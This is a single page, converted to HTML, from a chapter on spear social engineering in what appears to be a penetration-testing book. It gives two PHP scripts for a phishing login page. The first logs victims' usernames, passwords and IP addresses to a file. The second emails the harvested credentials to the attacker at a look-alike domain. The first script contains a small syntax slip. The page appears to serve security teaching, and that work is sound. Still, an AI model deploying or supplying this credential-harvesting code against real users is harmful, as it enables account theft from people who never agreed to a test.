<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfd0" class="pf w2 h2" data-page-no="d0"><div class="pc pcd0 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 6: Spear Social Engineering<span class="_ _9"> </span><span class="ff1 fs9 lsa">185</span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">called creds.txt. <span class="_ _3"/>Y<span class="_ _3"/>ou need to make sure the user your web serv<span class="_ _0"/>er is running as has </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">permissions to write to creds.txt. In this example, we’<span class="_ _2"/>re not only logging the user </div><div class="t m0 x3 hd y20f ff4 fs7 fc0 sc0 ls0 ws0">name and password—we’<span class="_ _2"/>re also logging the source IP address that the login request </div><div class="t m0 x3 hd y210 ff4 fs7 fc0 sc0 ls0 ws0">came from:</div><div class="t m0 x3 h44 y1398 fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y1399 fff fse fc0 sc0 ls0 ws0">      $name = $_POST['username'];</div><div class="t m0 x3 h44 y139a fff fse fc0 sc0 ls0 ws0">      $pass = $_POST['password'];</div><div class="t m0 x3 h44 y1003 fff fse fc0 sc0 ls0 ws0">      $srcip = $_SERVER['REMOTE_ADDR'];</div><div class="t m0 x3 h44 y139b fff fse fc0 sc0 ls0 ws0">      $fp = fopen('creds.txt', 'a');</div><div class="t m0 x3 h44 y139c fff fse fc0 sc0 ls0 ws0">      fwrite($fp, "$srcip - $name : $pass\n";);</div><div class="t m0 x3 h44 y139d fff fse fc0 sc0 ls0 ws0">      fclose($fp);</div><div class="t m0 x3 h44 y1007 fff fse fc0 sc0 ls0 ws0">?&gt;</div><div class="t m0 x4 hd y139e ff4 fs7 fc0 sc0 ls0 ws0">Logging to a le is good, but I prefer a slightly more proacti<span class="_ _0"/>v<span class="_ _0"/>e approach. I like my </div><div class="t m0 x3 hd y139f ff4 fs7 fc0 sc0 ls0 ws0">phishing websites to alert me when a user logs in. In the follo<span class="_ _0"/>wing example, we’<span class="_ _2"/>re </div><div class="t m0 x3 hd y13a0 ff4 fs7 fc0 sc0 ls0 ws0">actually e-mailing ourselves the credentials, which might not be what you w<span class="_ _0"/>ant to </div><div class="t m0 x3 hd y13a1 ff4 fs7 fc0 sc0 ls0 ws0">do in all cases. If you don’t think e-mailing yourself credentials is appropriate, you </div><div class="t m0 x3 hd y13a2 ff4 fs7 fc0 sc0 ls0 ws0">can combine the pre<span class="_ _0"/>vious example and write the credentials to a le and just alert </div><div class="t m0 x3 hd y13a3 ff4 fs7 fc0 sc0 ls0 ws0">yourself via e-mail that a user has logged in:</div><div class="t m0 x3 h44 y13a4 fff fse fc0 sc0 ls0 ws0">&lt;?php</div><div class="t m0 x3 h44 y13a5 fff fse fc0 sc0 ls0 ws0">$name = $_POST['username'];</div><div class="t m0 x3 h44 y13a6 fff fse fc0 sc0 ls0 ws0">$pass = $_POST['password'];</div><div class="t m0 x3 h44 y13a7 fff fse fc0 sc0 ls0 ws0">$srcip = $_SERVER['REMOTE_ADDR'];</div><div class="t m0 x3 h44 y13a8 fff fse fc0 sc0 ls0 ws0">$eol="\r\n";</div><div class="t m0 x3 h44 y13a9 fff fse fc0 sc0 ls0 ws0">$fromaddress = "alert@portal-weaktarget.com";</div><div class="t m0 x3 h44 y13aa fff fse fc0 sc0 ls0 ws0">$headers = "From: $fromaddress".$eol;</div><div class="t m0 x3 h44 y13ab fff fse fc0 sc0 ls0 ws0">$message = "Source: $srcip</div><div class="t m0 x3 h44 y13ac fff fse fc0 sc0 ls0 ws0">Name: $name</div><div class="t m0 x3 h44 y13ad fff fse fc0 sc0 ls0 ws0">Pass: $pass";</div><div class="t m0 x3 h44 y13ae fff fse fc0 sc0 ls0 ws0">$subject = "Portal Login";</div><div class="t m0 x3 h44 y13af fff fse fc0 sc0 ls0 ws0">$recipient = "me@portal-weaktarget.com";</div><div class="t m0 x3 h44 y13b0 fff fse fc0 sc0 ls0 ws0">$ret = mail ( $recipient  ,  $subject  ,  $message, $headers  );</div><div class="t m0 x3 h44 y13b1 fff fse fc0 sc0 ls0 ws0">?&gt;</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>